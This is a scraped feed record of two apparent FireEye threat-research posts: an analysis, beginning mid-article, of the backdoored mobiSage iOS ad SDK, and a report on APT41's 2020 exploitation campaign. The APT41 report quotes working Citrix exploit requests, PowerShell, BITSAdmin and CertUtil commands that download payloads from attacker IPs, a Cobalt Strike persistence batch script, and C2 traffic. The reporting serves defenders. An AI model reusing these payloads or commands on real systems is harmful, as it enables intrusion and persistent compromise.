trigger the most sensitive capabilities such as recording audio or stealing sensitive data, affected apps periodically contact the server to check for new JavaScript code. In the wrong hands, malicious JavaScript code that triggers the potential backdoors could be posted to eventually be downloaded and executed by affected apps.</p> \n<p> <a></a></p> \n<h1> <span class=\"type-LL\"> <a></a>Technical Details</span></h1> \n<p>As shown in Figure 1, the affected mobiSage library included two key components, separately implemented in Objective-C and JavaScript. The Objective-C component, which we refer to as <b>msageCore</b>, implements the underlying functionality of the potential backdoors and exposed interfaces to the JavaScript context through a WebView. The JavaScript component, which we refer to as <b>msageJS</b>, provides high-level execution logic and can trigger the potential backdoors by invoking the interfaces exposed by msageCore. Each component has its own separate version number.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig1.png\" width=\"233\" height=\"269\" /></p> \n<p> <span class=\"type-XS\">Figure 1: Key components of backdoored mobiSage SDK</span></p> \n<p>In the remainder of this section, we reveal internal details of msageCore, including its communication channel and high-risk interfaces. Then we describe how msageJS is launched and updated, and how it can trigger the backdoors.</p> \n<h2> <span class=\"type-LL\"> <a></a>Backdoors in msageCore</span></h2> \n<h5> <b>Communication channel</b></h5> \n<p>MsageCore implements a general framework to communicate with msageJS via the ad library’s WebView. Commands and parameters are passed via specially crafted URLs in the format <span class=\"code\">adsagejs://cmd&amp;parameter.</span> As shown in the reconstructed code fragment in Figure 2, msageCore fetches the command and parameters from the JavaScript context and inserts them in its command queue.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig2.png\" /></p> \n<p> <span class=\"type-XS\">Figure 2: Communication via URL loading in WebView</span></p> \n<p>To process a command in its queue, msageCore dispatches the command, along with its parameters, to a corresponding Objective-C class and method. Figure 3 shows portions of the reconstructed command dispatching code.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig3.png\" /></p> \n<p> <span class=\"type-XS\">Figure 3: Command dispatch in msageCore</span></p> \n<p> <b>At-risk interfaces</b></p> \n<p>Each dispatched command ultimately arrives at an Objective-C class in msageCore. Table 1 shows a subset of msageCore classes and the corresponding interfaces that they expose.</p> \n<table width=\"320\" cellspacing=\"0\" cellpadding=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td width=\"158\"><p> <b>msageCore Class Name</b></p> </td> \n   <td width=\"162\" valign=\"top\"><p> <b>Interfaces </b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"158\"><p>MSageCoreUIManagerPlugin</p> </td> \n   <td width=\"162\" valign=\"top\"><p>- captureAudio:</p> <p>- captureImage:</p> <p>- openMail:</p> <p>- openSMS:</p> <p>- openApp:</p> <p>- openInAppStore:</p> <p>- openCamera:</p> <p>- openImagePicker:</p> <p>- ...</p> </td> \n  </tr> \n  <tr> \n   <td width=\"158\"><p>MSageCoreLocation</p> </td> \n   <td width=\"162\" valign=\"top\"><p>- start:</p> <p>- stop:</p> <p>- setTimer:</p> <p>- returnLocationInfo:webViewId:</p> <p>- ...</p> </td> \n  </tr> \n  <tr> \n   <td width=\"158\"><p>MSageCorePluginFileModule</p> <p>&nbsp;</p> </td> \n   <td width=\"162\" valign=\"top\"><p>- createDir</p> <p>- deleteDir:</p> <p>- deleteFile:</p> <p>- createFile:</p> <p>- getFileContent:</p> <p>- ...</p> </td> \n  </tr> \n  <tr> \n   <td width=\"158\"><p>MSageCoreKeyChain</p> </td> \n   <td width=\"162\" valign=\"top\"><p>- writeKeyValue:</p> <p>- readValueByKey:</p> <p>- resetValueByKey:</p> </td> \n  </tr> \n  <tr> \n   <td width=\"158\"><p>MSageCorePluginNetWork</p> </td> \n   <td width=\"162\" valign=\"top\"><p>- sendHttpGet:</p> <p>- sendHttpPost:</p> <p>- sendHttpUpload:</p> <p>- ...</p> </td> \n  </tr> \n  <tr> \n   <td width=\"158\"><p>MSageCoreEncryptPlugin</p> </td> \n   <td width=\"162\" valign=\"top\"><p>- MD5Encrypt:</p> <p>- SHA1Encrypt:</p> <p>- AESEncrypt:</p> <p>- AESDecrypt:</p> <p>- DESEncrypt:</p> <p>- DESDecrypt:</p> <p>- XOREncrypt:</p> <p>- XORDecrypt:</p> <p>- RC4Encrypt:</p> <p>- RC4Decrypt</p> <p>- ...</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 1: Selected interfaces exposed by msageCore</span></p> \n<p>The selected interfaces reveal some of the key capabilities exposed by the potential backdoors in the library. They expose the potential ability to capture audio and screenshots while the affected app is in use, identify and launch other apps installed on the device, periodically monitor location, read and write files in the app’s data container, and read/write/reset “secure” keychain items stored by the app. Additionally, any data collected via these interfaces can be encrypted with various encryption schemes and uploaded to a remote server.</p> \n<p>Beyond the selected interfaces, the ad library potentially exposed users to additional risks by including logic to promote and install “enpublic” apps as shown in Figure 4. As we have highlighted in previous blogs [footnotes 3, 4, 5, 6, 7], enpublic apps can introduce additional security risks by using private APIs in certain versions of iOS. These private APIs potentially allow for background monitoring of SMS or phone calls, breaking the app sandbox, stealing email messages, and demolishing arbitrary app installations. Apple has addressed a number of issues related to enpublic apps that we have brought to their attention.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig4.png\" /></p> \n<p> <span class=\"type-XS\">Figure 4: Installing “enpublic” apps to bypass Apple App Store review</span></p> \n<p>We can see how this ad library functions by examining the implementations of some of the selected interfaces. Figure 5 shows reconstructed code snippets for capturing audio. Before storing recorded audio to a file <span class=\"code\">audio_xxx.wav</span>, the code retrieves two parameters from the command for recording duration and threshold.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig5.png\" /></p> \n<p> <span class=\"type-XS\">Figure 5: Capturing audio with duration and threshold</span></p> \n<p>Figure 6 shows a code snippet for initializing the app’s keychain before reading. The accessed keychain is in the <span class=\"code\">kSecClassGenericPassword</span> class, which is widely used by apps for storing secret credentials such as passwords.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig6.png\" /></p> \n<p> <span class=\"type-XS\">Figure 6: Reading the keychain in the kSecClassGenericPassword class</span></p> \n<h2> <span class=\"type-LL\"> <a></a>Remote control in msageJS</span></h2> \n<p>msageJS contains JavaScript code for communicating with a remote server and submitting commands to msageCore. The file layout of msageJS is shown in Figure 7. Inside <span class=\"code\">sdkjs.js</span>, we find a wrapper object called <span class=\"code\">adsage</span> and the JavaScript interface for command execution.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig7.png\" /></p> \n<p> <span class=\"type-XS\">Figure 7: The file layout of msageJS</span></p> \n<p>The command execution interface is constructed as follows:</p> \n<p> <b> <i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adsage.exec(className, methodName, argsList, onSuccess, onFailure);</i></b></p> \n<p>The <span class=\"code\">className</span> and <span class=\"code\">methodName</span> parameters correspond to classes and methods in msageCore. The <span class=\"code\">argsList</span> parameter can be either a list or dict, and the exact types and values can be determined by reversing the methods in msageCore. The final two parameters are function callbacks invoked when the method exits. For example, the following invocation starts audio capture:</p> \n<p> <b> <i>adsage.exec(\"MSageCoreUIManager\", \"captureAudio\", [\"Hey\", 10, 40],&nbsp; onSuccess, onFailure);</i></b></p> \n<p>Note that the files comprising msageJS cannot be found by simply listing the files in an affected app’s IPA. The files themselves are zipped and encoded in Base64 in the data section of the ad library binary. After an affected app is launched, msageCore first decodes the string and extracts msageJS to the app’s data container, setting <span class=\"code\">index.html</span> shown in Figure 7 as the landing page in the ad library WebView to launch msageJS.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig8.png\" /></p> \n<p> <span class=\"type-XS\">Figure 8: Base64 encoded JavaScript component in Zip format</span></p> \n<p>When msageJS is launched, it sends a POST request to <span class=\"code\">hxxp://entry.adsage.com/d/ </span>to check for updates. The server responds with information about the latest msageJS version, including a download URL, as shown in Figure 9.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig9.png\" /></p> \n<p> <span class=\"type-XS\">Figure 9: Server response to msageJS update request via HTTP POST</span></p> \n<p> <a></a></p> \n<h4> <a></a><b>Enterprise Protection</b></h4> \n<p>To ensure the protection of our customers, FireEye has deployed detection rules in its <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products-delete/nx-network-security-products.html\">Network Security (NX)</a> and Mobile Threat Prevention (MTP) products to identify the affected apps and their network activities.</p> \n<p>For FireEye NX customers, alerts will be generated if an employee uses an infected app while their iOS device is connected to the corporate network. FireEye MTP management customers have full visibility into high-risk apps installed on mobile devices in their deployment base. End users will receive on-device notifications of the risky app and IT administrators receive email alerts.</p> \n<h1> <span class=\"type-LL\">Conclusion</span></h1> \n<p>In this blog, we described an ad library that affected thousands of iOS apps with potential backdoor functionality. We revealed the internals of backdoors which could be used to trigger audio recording, capture screenshots, prompt the user to side-load other high-risk apps, and read sensitive data from the app’s keychain, among other dubious capabilities. We also showed how these potential backdoors in ad libraries could be controlled remotely by JavaScript code should their ad servers fall under malicious actors’ control.<br /> <br /> [2] <a href=\"http://www.adsage.cn/\">http://www.adsage.cn/</a><br /> [3] <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2015/08/ios_masque_attackwe.html\">https://www.fireeye.com/blog/threat-research/2015/08/ios_masque_attackwe.html</a><br /> [4] <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2015/02/ios_masque_attackre.html\">https://www.fireeye.com/blog/threat-research/2015/02/ios_masque_attackre.html</a><br /> [5] <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2014/11/masque-attack-all-your-ios-apps-belong-to-us.html\">https://www.fireeye.com/blog/threat-research/2014/11/masque-attack-all-your-ios-apps-belong-to-us.html</a><br /> [6] <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2015/06/three_new_masqueatt.html\">https://www.fireeye.com/blog/threat-research/2015/06/three_new_masqueatt.html</a><br /> [7] <a href=\"https://www.virusbtn.com/virusbulletin/archive/2014/11/vb201411-Apple-without-shell\">https://www.virusbtn.com/virusbulletin/archive/2014/11/vb201411-Apple-without-shell</a></p>","descriptionType":"html","publishedDate":"Wed, 04 Nov 2015 18:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig1.png","linkMd5":"c3feda04965399daf18baaa598d935ca","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn47@2020_2/2020/08/24/14-11-05-052_253624e9a284cda7.webp","destWidth":250,"destHeight":288,"sourceBytes":16791,"destBytes":8944,"author":"Zhaofeng Chen","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig1.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn47@2020_2/2020/08/24/14-11-05-052_253624e9a284cda7.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig2.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn82@2020_2/2020/08/24/14-11-16-727_e4f0b807e14d3d5f.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig3.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn59@2020_4/2020/08/24/14-11-17-522_c6c7a083979074d3.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig4.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn34@2020_6/2020/08/24/14-11-15-058_148636b4b294f0f8.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig5.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn91@2020_2/2020/08/24/14-11-16-018_61bd6b4c7562569d.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig6.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn2@2020_6/2020/08/24/14-11-13-044_98c2aeac99bebe41.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig7.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn82@2020_2/2020/08/24/14-11-15-001_8bd2ed9cd98f9911.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig8.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn72@2020_2/2020/08/24/14-11-11-907_a5aa71a1888bff28.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/ibackdoor/ibackdoorfig9.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn35@2020_1/2020/08/24/14-11-12-453_39e140a6f9a4128c.webp"},"publishedOrCreatedDate":1598278264221},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"This Is Not a Test: APT41 Initiates Global Intrusion Campaign Using\nMultiple Exploits","link":"http://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html","description":"<p>Beginning this year, FireEye observed <a href=\"https://content.fireeye.com/apt-41/rpt-apt41/\">Chinese actor APT41</a> carry out one of the broadest campaigns by a Chinese cyber espionage actor we have observed in recent years. Between January 20 and March 11, FireEye observed <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/08/game-over-detecting-and-stopping-an-apt41-operation.html\">APT41</a> attempt to exploit vulnerabilities in&nbsp;<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-19781\">Citrix NetScaler/ADC</a>, Cisco routers, and <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-10189\">Zoho ManageEngine Desktop Central</a> at over 75 FireEye customers. Countries we’ve seen targeted include Australia, Canada, Denmark, Finland, France, India, Italy, Japan, Malaysia, Mexico, Philippines, Poland, Qatar, Saudi Arabia, Singapore, Sweden, Switzerland, UAE, UK and USA. The following industries were targeted: Banking/Finance, Construction, Defense Industrial Base, Government, Healthcare, High Technology, Higher Education, Legal, Manufacturing, Media, Non-profit, Oil &amp; Gas, Petrochemical, Pharmaceutical, Real Estate, Telecommunications, Transportation, Travel, and Utility. It’s unclear if APT41 scanned the Internet and attempted exploitation en masse or selected a subset of specific organizations to target, but the victims appear to be more targeted in nature.</p> \n<h4>Exploitation of CVE-2019-19781 (Citrix Application Delivery Controller [ADC])</h4> \n<p>Starting on January 20, 2020, APT41 used the IP address 66.42.98[.]220 to attempt exploits of Citrix Application Delivery Controller (ADC) and Citrix Gateway devices with <a href=\"https://support.citrix.com/article/CTX267027\">CVE-2019-19781</a> (published December 17, 2019).</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/apt41exploits/apt41-timeline-blog-v2.png\" alt=\"\" /> <br /> <span class=\"type-XS\">Figure 1: Timeline of key events</span></p> \n<p>The initial CVE-2019-19781 exploitation activity on January 20 and January 21, 2020, involved execution of the command ‘file /bin/pwd’, which may have achieved two objectives for APT41. First, it would confirm whether the system was vulnerable and the <a href=\"https://support.citrix.com/article/CTX267679\">mitigation</a> wasn’t applied. Second, it may return architecture-related information that would be required knowledge for APT41 to successfully deploy a backdoor in a follow-up step.&nbsp;&nbsp;</p> \n<p>One interesting thing to note is that all observed requests were only performed against Citrix devices, suggesting APT41 was operating with an already-known list of identified devices accessible on the internet.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><p>POST /vpns/portal/scripts/newbm.pl HTTP/1.1<br /> Host: [redacted]<br /> Connection: close<br /> Accept-Encoding: gzip, deflate<br /> Accept: */*<br /> User-Agent: python-requests/2.22.0<br /> NSC_NONCE: nsroot<br /> NSC_USER: ../../../netscaler/portal/templates/[redacted]<br /> Content-Length: 96<br /> <br /> url=http://example.com&amp;title=[redacted]&amp;desc=[% template.new('BLOCK' = 'print `file /bin/pwd`') %]</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 2: Example APT41 HTTP traffic exploiting CVE-2019-19781</span></p> \n<p>There is a lull in APT41 activity between January 23 and February 1, which is likely related to the Chinese Lunar New Year holidays which occurred between January 24 and January 30, 2020. This has been a common activity pattern by Chinese APT groups in past years as well.</p> \n<p>Starting on February 1, 2020, APT41 moved to using CVE-2019-19781 exploit payloads that initiate a download via the File Transfer Protocol (FTP). Specifically, APT41 executed the command ‘/usr/bin/ftp -o /tmp/bsd ftp://test:[redacted]\\@66.42.98[.]220/bsd’, which connected to 66.42.98[.]220 over the FTP protocol, logged in to the FTP server with a username of ‘test’ and a password that we have redacted, and then downloaded an unknown payload named ‘bsd’ (which was likely a backdoor).</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><p>POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1<br /> Accept-Encoding: identity<br /> Content-Length: 147<br /> Connection: close<br /> Nsc_User: ../../../netscaler/portal/templates/[redacted]<br /> User-Agent: Python-urllib/2.7<br /> Nsc_Nonce: nsroot<br /> Host: [redacted]<br /> Content-Type: application/x-www-form-urlencoded<br /> <br /> url=http://example.com&amp;title=[redacted]&amp;desc=[% template.new('BLOCK' = '<b>print `/usr/bin/ftp -o /tmp/bsd ftp://test:[redacted]\\@66.42.98[.]220/bsd</b>`') %]</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 3: Example APT41 HTTP traffic exploiting CVE-2019-19781</span></p> \n<p>We did not observe APT41 activity at FireEye customers between February 2 and February 19, 2020. China initiated COVID-19 related quarantines in cities in Hubei province starting on January 23 and January 24, and rolled out quarantines to additional provinces starting between February 2 and February 10. While it is possible that this reduction in activity might be related to the COVID-19 quarantine measures in China, APT41 may have remained active in other ways, which we were unable to observe with FireEye telemetry. We observed a significant uptick in CVE-2019-19781 exploitation on February 24 and February 25. The exploit behavior was almost identical to the activity on February 1, where only the name of the payload ‘un’ changed.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><p>POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1<br /> Accept-Encoding: identity<br /> Content-Length: 145<br /> Connection: close<br /> Nsc_User: ../../../netscaler/portal/templates/[redacted]<br /> User-Agent: Python-urllib/2.7<br /> Nsc_Nonce: nsroot<br /> Host: [redacted]<br /> Content-Type: application/x-www-form-urlencoded<br /> <br /> url=http://example.com&amp;title= [redacted]&amp;desc=[% template.new('BLOCK' = '<b>print `/usr/bin/ftp -o /tmp/un ftp://test:[redacted]\\@66.42.98[.]220/un</b>`') %]</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 4: Example APT41 HTTP traffic exploiting CVE-2019-19781</span></p> \n<p>Citrix released a <a href=\"https://support.citrix.com/article/CTX267027\">mitigation</a> for CVE-2019-19781 on December 17, 2019, and as of January 24, 2020, released permanent fixes for all supported versions of Citrix ADC, Gateway, and SD-WAN WANOP.</p> \n<h4>Cisco Router Exploitation</h4> \n<p>On February 21, 2020, APT41 successfully exploited a Cisco RV320 router at a telecommunications organization and downloaded a 32-bit ELF binary payload compiled for a 64-bit MIPS processor named ‘fuc’ (MD5: 155e98e5ca8d662fad7dc84187340cbc). It is unknown what specific exploit was used, but there is a Metasploit module that combines two CVE’s (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-1653\">CVE-2019-1653</a> and <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-1652\">CVE-2019-1652</a>) to <a href=\"https://www.rapid7.com/db/modules/exploit/linux/http/cisco_rv32x_rce\">enable remote code execution&nbsp;on Cisco RV320 and RV325</a> small business routers and uses wget to download the specified payload.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><p>GET /test/fuc<br /> HTTP/1.1<br /> Host: 66.42.98\\.220<br /> User-Agent: Wget<br /> Connection: close</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 5: Example HTTP request showing Cisco RV320 router downloading a payload via wget</span></p> \n<p>66.42.98[.]220 also hosted a file name http://66.42.98[.]220/test/1.txt. The content of 1.txt (MD5: &nbsp;c0c467c8e9b2046d7053642cc9bdd57d) is ‘cat /etc/flash/etc/nk_sysconfig’, which is the command one would execute on a Cisco RV320 router to display the current configuration.</p> \n<p>Cisco PSIRT confirmed that fixed software to address the noted vulnerabilities is available and asks customers to review the following security advisories and take appropriate action:</p> \n<ul> \n <li> <a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info\">Cisco Small Business RV320 and RV325 Routers Information Disclosure Vulnerability</a></li> \n <li> <a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject\">Cisco Small Business RV320 and RV325 Routers Command Injection Vulnerability</a></li> \n</ul> \n<h4>Exploitation of CVE-2020-10189 (Zoho ManageEngine Zero-Day Vulnerability)</h4> \n<p>On March 5, 2020, researcher&nbsp;<a href=\"https://twitter.com/steventseeley/status/1235635108498948096?s=20\">Steven Seeley</a>, published <a href=\"https://srcincite.io/advisories/src-2020-0011/\">an advisory</a> and released&nbsp;<a href=\"https://srcincite.io/pocs/src-2020-0011.py.txt\">proof-of-concept code</a> for a zero-day remote code execution vulnerability in Zoho ManageEngine Desktop Central versions prior to 10.0.474 (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-10189\">CVE-2020-10189)</a>. Beginning on March 8, FireEye observed APT41 use 91.208.184[.]78 to attempt to exploit the Zoho ManageEngine vulnerability at more than a dozen FireEye customers, which resulted in the compromise of at least five separate customers. FireEye observed two separate variations of how the payloads (install.bat and storesyncsvc.dll) were deployed. In the first variation the CVE-2020-10189 exploit was used to directly upload “logger.zip”, a simple Java based program, which contained a set of commands to use PowerShell to download and execute install.bat and storesyncsvc.dll.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><p>java/lang/Runtime</p> <p>getRuntime</p> <p>()Ljava/lang/Runtime;</p> <p>Xcmd /c powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/install.bat','C:\\<br /> Windows\\Temp\\install.bat')&amp;powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/storesyncsvc.dll','<br /> C:\\Windows\\Temp\\storesyncsvc.dll')&amp;C:\\Windows\\Temp\\install.bat</p> <p>'(Ljava/lang/String;)Ljava/lang/Process;</p> <p>StackMapTable</p> <p>ysoserial/Pwner76328858520609</p> <p>Lysoserial/Pwner76328858520609;</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 6: Contents of logger.zip</span></p> \n<p>Here we see a toolmark from the tool <a href=\"https://github.com/frohoff/ysoserial\">ysoserial</a> that was used to create the payload in the POC. The string Pwner76328858520609 is unique to the POC payload, indicating that APT41 likely used the POC as source material in their operation.</p> \n<p>In the second variation, FireEye observed APT41 leverage the Microsoft BITSAdmin command-line tool to download install.bat (MD5: 7966c2c546b71e800397a67f942858d0) from known APT41 infrastructure 66.42.98[.]220 on port 12345.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><p>Parent Process: C:\\ManageEngine\\DesktopCentral_Server\\jre\\bin\\java.exe</p> <p>Process Arguments: cmd /c bitsadmin /transfer bbbb http://66.42.98[.]220:12345/test/install.bat C:\\Users\\Public\\install.bat</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 7: Example FireEye Endpoint Security event depicting successful CVE-2020-10189 exploitation</span></p> \n<p>In both variations, the install.bat batch file was used to install persistence for a trial-version of Cobalt Strike BEACON loader named storesyncsvc.dll (MD5: 5909983db4d9023e4098e56361c96a6f).</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><p>@echo off</p> <p>set \"WORK_DIR=C:\\Windows\\System32\"</p> <p>set \"DLL_NAME=storesyncsvc.dll\"</p> <p>set \"SERVICE_NAME=StorSyncSvc\"</p> <p>set \"DISPLAY_NAME=Storage Sync Service\"</p> <p>set \"DESCRIPTION=The Storage Sync Service is the top-level resource for File Sync. It creates sync relationships with multiple storage accounts via multiple sync groups. If this service is stopped or disabled, applications will be unable to run collectly.\"</p> <p>&nbsp;sc stop %SERVICE_NAME%</p> <p>sc delete %SERVICE_NAME%</p> <p>mkdir %WORK_DIR%</p> <p>copy \"%~dp0%DLL_NAME%\" \"%WORK_DIR%\" /Y</p> <p>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v \"%SERVICE_NAME%\" /t REG_MULTI_SZ /d \"%SERVICE_NAME%\" /f</p> <p>sc create \"%SERVICE_NAME%\" binPath= \"%SystemRoot%\\system32\\svchost.exe -k %SERVICE_NAME%\" type= share start= auto error= ignore DisplayName= \"%DISPLAY_NAME%\"</p> <p>SC failure \"%SERVICE_NAME%\" reset= 86400 actions= restart/60000/restart/60000/restart/60000</p> <p>sc description \"%SERVICE_NAME%\" \"%DESCRIPTION%\"</p> <p>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\%SERVICE_NAME%\\Parameters\" /f</p> <p>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\%SERVICE_NAME%\\Parameters\" /v \"ServiceDll\" /t REG_EXPAND_SZ /d \"%WORK_DIR%\\%DLL_NAME%\" /f</p> <p>net start \"%SERVICE_NAME%\"</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 8: Contents of install.bat</span></p> \n<p>Storesyncsvc.dll was a Cobalt Strike BEACON implant (trial-version) which connected to exchange.dumb1[.]com (with a DNS resolution of 74.82.201[.]8) using a jquery malleable command and control (C2) profile.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><p>GET /jquery-3.3.1.min.js HTTP/1.1<br /> Host: cdn.bootcss.com<br /> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br /> Referer: http://cdn.bootcss.com/<br /> Accept-Encoding: gzip, deflate<br /> Cookie: __cfduid=CdkIb8kXFOR_9Mn48DQwhIEuIEgn2VGDa_XZK_xAN47OjPNRMpJawYvnAhPJYM<br /> DA8y_rXEJQGZ6Xlkp_wCoqnImD-bj4DqdTNbj87Rl1kIvZbefE3nmNunlyMJZTrDZfu4EV6oxB8yKMJfLXydC5YF9OeZwqBSs3Tun12BVFWLI<br /> User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko<br /> Connection: Keep-Alive Cache-Control: no-cache</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 9: Example APT41 Cobalt Strike BEACON jquery malleable C2 profile HTTP request</span></p> \n<p>Within a few hours of initial exploitation, APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor with a different C2 address that uses Microsoft CertUtil, a common <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/08/game-over-detecting-and-stopping-an-apt41-operation.html\">TTP that we’ve observed APT41 use in past intrusions</a>, which they then used to download 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c). The file 2.exe was a VMProtected Meterpreter downloader used to download Cobalt Strike BEACON shellcode. The <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html\">usage of VMProtected binaries</a> is another very common TTP that we’ve observed this group leverage in multiple intrusions in order to delay analysis of other tools in their toolkit.</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><p>GET /2.exe HTTP/1.1<br /> Cache-Control: no-cache<br /> Connection: Keep-Alive<br /> Pragma: no-cache<br /> Accept: */*<br /> User-Agent: Microsoft-CryptoAPI/6.3<br /> Host: 91.208.184[.]78</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 10: Example HTTP request downloading ‘2.exe’ VMProtected Meterpreter downloader via CertUtil</span></p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><p>certutil&nbsp; -urlcache -split -f http://91.208.184[.]78/2.exe</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 11: Example CertUtil command to download ‘2.exe’ VMProtected Meterpreter downloader</span></p> \n<p>The Meterpreter downloader ‘TzGG’ was configured to communicate with 91.208.184[.]78 over port 443 to download the shellcode (MD5: 659bd19b562059f3f0cc978e15624fd9) for Cobalt Strike BEACON (trial-version).</p> \n<table cellpadding=\"1\" cellspacing=\"0\" border=\"1\"> \n <tbody> \n  <tr> \n   <td><p>GET /TzGG HTTP/1.1<br /> User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)<br /> Host: 91.208.184[.]78:443<br /> Connection: Keep-Alive<br /> Cache-Control: no-cache</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Figure 12: Example HTTP request downloading ‘TzGG’ shellcode for Cobalt Strike BEACON</span></p> \n<p>The downloaded BEACON shellcode connected to the same C2 server: 91.208.184[.]78. We believe this is an example of the actor attempting to diversify post-exploitation access to the compromised systems.</p> 